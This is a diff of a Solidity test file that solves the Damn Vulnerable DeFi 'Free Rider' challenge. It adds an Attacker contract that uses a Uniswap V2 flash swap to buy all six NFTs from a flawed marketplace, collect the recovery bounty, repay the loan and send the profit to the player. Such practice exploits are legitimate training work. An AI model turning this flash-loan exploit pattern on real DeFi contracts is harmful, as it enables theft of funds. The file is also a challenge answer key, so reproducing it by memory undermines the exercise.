@@ -2,15 +2,109 @@
 // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
 pragma solidity =0.8.25;
 
-import {Test, console} from "forge-std/Test.sol";
-import {WETH} from "solmate/tokens/WETH.sol";
-import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
-import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
-import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
-import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
-import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
-import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
-import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import { Test, console } from "forge-std/Test.sol";
+import { WETH } from "solmate/tokens/WETH.sol";
+import { IUniswapV2Callee } from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
+import { IUniswapV2Pair } from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
+import { IUniswapV2Factory } from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
+import { IUniswapV2Router02 } from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
+import { DamnValuableToken } from "../../src/DamnValuableToken.sol";
+import { FreeRiderNFTMarketplace } from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
+import { FreeRiderRecoveryManager } from "../../src/free-rider/FreeRiderRecoveryManager.sol";
+import { DamnValuableNFT } from "../../src/DamnValuableNFT.sol";
+
+contract Attacker is IUniswapV2Callee {
+    IUniswapV2Pair pair;
+    FreeRiderNFTMarketplace marketplace;
+    DamnValuableNFT nft;
+    FreeRiderRecoveryManager recoveryManager;
+    WETH weth;
+
+    receive() external payable {}
+
+    constructor(
+        IUniswapV2Pair _pair,
+        FreeRiderNFTMarketplace _marketplace,
+        DamnValuableNFT _nft,
+        FreeRiderRecoveryManager _recoveryManager,
+        WETH _weth
+    ) {
+        pair = _pair;
+        marketplace = _marketplace;
+        nft = _nft;
+        recoveryManager = _recoveryManager;
+        weth = _weth;
+    }
+
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external returns (bytes4) {
+        return this.onERC721Received.selector;
+    }
+
+    function uniswapV2Call(
+        address sender,
+        uint amount0,
+        uint /*amount1*/,
+        bytes calldata data
+    ) external {
+        require(msg.sender == address(pair), "not pair");
+        require(sender == address(this), "not sender");
+
+        (address player, uint256 amountOfNFT) = abi.decode(
+            data,
+            (address, uint256)
+        );
+
+        address token0 = IUniswapV2Pair(msg.sender).token0();
+        require(token0 == address(weth), "token borrow != WETH");
+        weth.withdraw(amount0);
+
+        uint256[] memory ids = new uint256[](amountOfNFT);
+        for (uint256 i = 0; i < amountOfNFT; i++) {
+            ids[i] = i;
+        }
+
+        marketplace.buyMany{ value: amount0 }(ids);
+
+        for (uint256 i = 0; i < amountOfNFT; i++) {
+            nft.safeTransferFrom(
+                address(this),
+                address(recoveryManager),
+                ids[i],
+                abi.encode(address(this))
+            );
+        }
+
+        // about 0.3% fee, +1 to round up
+        uint256 fee = (amount0 * 3) / 997 + 1;
+        uint256 amountToRepay = amount0 + fee;
+
+        weth.deposit{ value: amountToRepay }();
+
+        // Repay
+        weth.transfer(address(pair), amountToRepay);
+
+        (bool isSuccess, ) = payable(player).call{
+            value: address(this).balance
+        }("");
+        require(isSuccess);
+    }
+
+    function recovery(
+        address player,
+        uint256 amountOfNFT,
+        uint256 wethAmount
+    ) external {
+        // Need to pass some data to trigger uniswapV2Call
+        bytes memory data = abi.encode(player, amountOfNFT);
+        // amount0Out is WETHtoken, amount1Out is DamnValuableToken
+        pair.swap(wethAmount, 0, address(this), data);
+    }
+}
 
 contract FreeRiderChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -58,13 +152,21 @@ contract FreeRiderChallenge is Test {
         weth = new WETH();
 
         // Deploy Uniswap V2 Factory and Router
-        uniswapV2Factory = IUniswapV2Factory(deployCode("builds/uniswap/UniswapV2Factory.json", abi.encode(address(0))));
+        uniswapV2Factory = IUniswapV2Factory(
+            deployCode(
+                "builds/uniswap/UniswapV2Factory.json",
+                abi.encode(address(0))
+            )
+        );
         uniswapV2Router = IUniswapV2Router02(
-            deployCode("builds/uniswap/UniswapV2Router02.json", abi.encode(address(uniswapV2Factory), address(weth)))
+            deployCode(
+                "builds/uniswap/UniswapV2Router02.json",
+                abi.encode(address(uniswapV2Factory), address(weth))
+            )
         );
 
         token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
-        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
+        uniswapV2Router.addLiquidityETH{ value: UNISWAP_INITIAL_WETH_RESERVE }(
             address(token), // token to be traded against WETH
             UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
             0, // amountTokenMin
@@ -74,11 +176,15 @@ contract FreeRiderChallenge is Test {
         );
 
         // Get a reference to the created Uniswap pair
-        uniswapPair = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));
+        uniswapPair = IUniswapV2Pair(
+            uniswapV2Factory.getPair(address(token), address(weth))
+        );
 
         // Deploy the marketplace and get the associated ERC721 token
         // The marketplace will automatically mint AMOUNT_OF_NFTS to the deployer (see `FreeRiderNFTMarketplace::constructor`)
-        marketplace = new FreeRiderNFTMarketplace{value: MARKETPLACE_INITIAL_ETH_BALANCE}(AMOUNT_OF_NFTS);
+        marketplace = new FreeRiderNFTMarketplace{
+            value: MARKETPLACE_INITIAL_ETH_BALANCE
+        }(AMOUNT_OF_NFTS);
 
         // Get a reference to the deployed NFT contract. Then approve the marketplace to trade them.
         nft = marketplace.token();
@@ -94,8 +200,12 @@ contract FreeRiderChallenge is Test {
         marketplace.offerMany(ids, prices);
 
         // Deploy recovery manager contract, adding the player as the beneficiary
-        recoveryManager =
-            new FreeRiderRecoveryManager{value: BOUNTY}(player, address(nft), recoveryManagerOwner, BOUNTY);
+        recoveryManager = new FreeRiderRecoveryManager{ value: BOUNTY }(
+            player,
+            address(nft),
+            recoveryManagerOwner,
+            BOUNTY
+        );
 
         vm.stopPrank();
     }
@@ -115,7 +225,9 @@ contract FreeRiderChallenge is Test {
             assertEq(nft.ownerOf(id), deployer);
         }
         assertEq(marketplace.offersCount(), 6);
-        assertTrue(nft.isApprovedForAll(address(recoveryManager), recoveryManagerOwner));
+        assertTrue(
+            nft.isApprovedForAll(address(recoveryManager), recoveryManagerOwner)
+        );
         assertEq(address(recoveryManager).balance, BOUNTY);
     }
 
@@ -123,7 +235,17 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        
+        // Uniswap v2 flash swap:
+        // https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/using-flash-swaps
+        // https://solidity-by-example.org/defi/uniswap-v2-flash-swap/
+        Attacker attacker = new Attacker(
+            uniswapPair,
+            marketplace,
+            nft,
+            recoveryManager,
+            weth
+        );
+        attacker.recovery(player, AMOUNT_OF_NFTS, NFT_PRICE);
     }
 
     /**
@@ -133,7 +255,11 @@ contract FreeRiderChallenge is Test {
         // The recovery owner extracts all NFTs from its associated contract
         for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
             vm.prank(recoveryManagerOwner);
-            nft.transferFrom(address(recoveryManager), recoveryManagerOwner, tokenId);
+            nft.transferFrom(
+                address(recoveryManager),
+                recoveryManagerOwner,
+                tokenId
+            );
             assertEq(nft.ownerOf(tokenId), recoveryManagerOwner);
         }
 
